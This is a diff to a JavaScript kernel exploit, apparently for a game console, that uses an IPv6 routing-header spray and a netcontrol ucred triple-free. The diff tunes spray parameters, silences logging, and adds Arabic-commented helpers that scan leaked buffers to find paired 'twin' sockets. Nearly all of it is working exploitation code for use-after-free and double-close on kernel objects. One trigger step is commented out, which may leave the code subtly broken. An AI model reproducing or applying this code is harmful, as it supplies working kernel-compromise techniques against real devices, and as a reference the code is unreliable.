@@ -114,9 +114,9 @@ var UIO_IOV_NUM = 0x14; // 20
 var MSG_IOV_NUM = 0x17; // 23
 
 // Params for kext stability
-var IPV6_SOCK_NUM = 64;
-var IOV_THREAD_NUM = 4;
-var UIO_THREAD_NUM = 4;
+var IPV6_SOCK_NUM = 8;
+var IOV_THREAD_NUM = 2;
+var UIO_THREAD_NUM = 2;
 var MAIN_LOOP_ITERATIONS = 3;
 var TRIPLEFREE_ITERATIONS = 4;
 var MAX_ROUNDS_TWIN = 10;
@@ -237,18 +237,18 @@ function get_sockopt(sd, level, optname, optval, optlen) {
   return read32(sockopt_len_ptr);
 }
 function set_rthdr(sd, buf, len) {
-  log("[set_rthdr] sd=" + sd + " len=" + len);
+  //log("[set_rthdr] sd=" + sd + " len=" + len);
   var ret = set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
-  log("[set_rthdr] ret=" + ret);
+  //log("[set_rthdr] ret=" + ret);
   return ret;
   // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
   // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
   // return ret;
 }
 function get_rthdr(sd, buf, max_len) {
-  log("[get_rthdr] sd=" + sd + " max_len=" + max_len);
+  //log("[get_rthdr] sd=" + sd + " max_len=" + max_len);
   var ret = get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
-  log("[get_rthdr] ret=" + ret);
+  //log("[get_rthdr] ret=" + ret);
   return ret;
   // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
   // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
@@ -625,7 +625,7 @@ function init() {
     return false;
   }
   kernel_offset = get_kernel_offset(FW_VERSION);
-  send_notification ('Kernel offsets loaded for FW ' + FW_VERSION);
+  log('Kernel offsets loaded for FW ' + FW_VERSION);
   return true;
 }
 var prev_core = -1;
@@ -766,6 +766,80 @@ function cleanup() {
   set_rtprio(prev_rtprio);
   log('Cleanup completed');
 }
+function monitor_header(sock, buf, maxLen, tag) {
+  // اطلب القراءة
+  write32(tag_len, maxLen);
+  const ret = get_rthdr(sock, buf, tag_len);
+
+  log_monitor("ret", ret);
+
+  if (ret < 0) {
+    log_monitor("status", "FAIL");
+    return { ok: false };
+  }
+
+  // الطول الفعلي
+  const actual_len = read32(tag_len);
+  log_monitor("len", actual_len);
+
+  // اعمل scan
+  const hits = scan_for_tag(buf, actual_len, tag);
+
+  return {
+    ok: true,
+    len: actual_len,
+    hits
+  };
+}
+function scan_for_tag(buf, maxLen, tag) {
+  const hits = [];
+
+  for (let off = 0; off + 4 <= maxLen; off += 4) {
+    const val = read32(buf.add(off));
+
+    if ((val & 0xFFFF0000) === tag) {
+      hits.push({ off, val });
+    }
+  }
+
+  if (hits.length === 0) {
+    log_monitor("tag_found", false);
+  } else {
+    log_monitor("tag_found", true);
+    log_monitor("tag_hits", hits);
+  }
+
+  return hits;
+}
+function log_monitor(key, value) {
+  console.log("[MON]", key, "=", value);
+}
+// خريطة تكرار الأوفستات
+var offset_map = {};
+
+// تحديث الخريطة
+function update_offset_map(hits) {
+    for (let h of hits) {
+        if (!offset_map[h.off]) offset_map[h.off] = 0;
+        offset_map[h.off]++;
+    }
+}
+
+// اختيار أفضل أوفست
+function get_best_offset() {
+    let best = -1;
+    let bestCount = -1;
+
+    for (let off in offset_map) {
+        if (offset_map[off] > bestCount) {
+            bestCount = offset_map[off];
+            best = parseInt(off);
+        }
+    }
+
+    return best; // ممكن يرجع -1 لو مفيش حاجة
+}
+
 function fill_buffer_64(buf, val, len) {
   if (!buf || buf.eq(0) || len <= 0) {
     return;
@@ -802,17 +876,37 @@ function find_twins() {
     }
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
-      write32(leak_add, 0); // تعديل رقم 4
-      get_rthdr(ipv6_socks[i], leak_rthdr, 32);
-      val = read32(leak_add);
-      j = val & 0xFFFF;
-      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
+
+      write32(leak_add, 0);
+
+      // استخدم المونيتور بدل القراءة المباشرة
+      const mon = monitor_header(ipv6_socks[i], leak_rthdr, 64, RTHDR_TAG);
+
+      if (!mon.ok) continue;
+      if (mon.hits.length === 0) continue;
+
+      // حدّث خريطة الأوفستات
+      update_offset_map(mon.hits);
+
+      // اختار أفضل أوفست لحد دلوقتي
+      const best_off = get_best_offset();
+
+      // لو لسه مفيش أوفست ثابت، استخدم أول hit
+      const hit = (best_off === -1)
+        ? mon.hits[0]
+        : mon.hits.find(h => h.off === best_off) || mon.hits[0];
+
+      const j = hit.val & 0xFFFF;
+
+      if (i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
-        log(' TWINS : [' + i + '] [' + j + ']');
+        log("TWINS : [" + i + "] [" + j + "]");
         return true;
       }
+
     }
+
     count++;
   }
   twins[0] = -1;
@@ -1290,16 +1384,16 @@ function trigger_ucred_triplefree() {
 
     // 1) dummy socket → register in netcontrol
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("[STEP 1] create dummy socket: dummy_socket=" + dummy_socket);
+    //send_notification("[STEP 1] create dummy socket: dummy_socket=" + dummy_socket);
 
     var sock_buf = malloc(8);
     write32(sock_buf, dummy_socket);
-    send_notification("[STEP 1] alloc sock_buf + write fd: sock_buf=" + sock_buf + " fd=" + dummy_socket);
+    //send_notification("[STEP 1] alloc sock_buf + write fd: sock_buf=" + sock_buf + " fd=" + dummy_socket);
 
     send_notification("[STEP 1] netcontrol register: cmd=" + hex(0x20000003) + " buf=" + sock_buf);
-    netcontrol(-1, 0x20000003, sock_buf, 8);
+   // netcontrol(-1, 0x20000003, sock_buf, 8);
 
-    send_notification("[STEP 1] close dummy_socket: fd=" + dummy_socket);
+    //send_notification("[STEP 1] close dummy_socket: fd=" + dummy_socket);
     close(new BigInt(dummy_socket));
 
 
@@ -1319,7 +1413,7 @@ function trigger_ucred_triplefree() {
     // 5) unregister → free file + ucred
     ctrl_buf = malloc(8);
     write32(ctrl_buf, uaf_socket);
-    send_notification("[STEP 5] unregister netcontrol: ctrl_buf=" + ctrl_buf + " fd=" + uaf_socket);
+    //send_notification("[STEP 5] unregister netcontrol: ctrl_buf=" + ctrl_buf + " fd=" + uaf_socket);
     netcontrol(-1, 0x20000007, ctrl_buf, 8);
 
 
@@ -1333,7 +1427,7 @@ function trigger_ucred_triplefree() {
 
 
     // 7) double free أول مرة
-    send_notification("[STEP 7] first double-close: fd=" + uaf_socket);
+    //send_notification("[STEP 7] first double-close: fd=" + uaf_socket);
     close(dup(new BigInt(uaf_socket)));
 
 
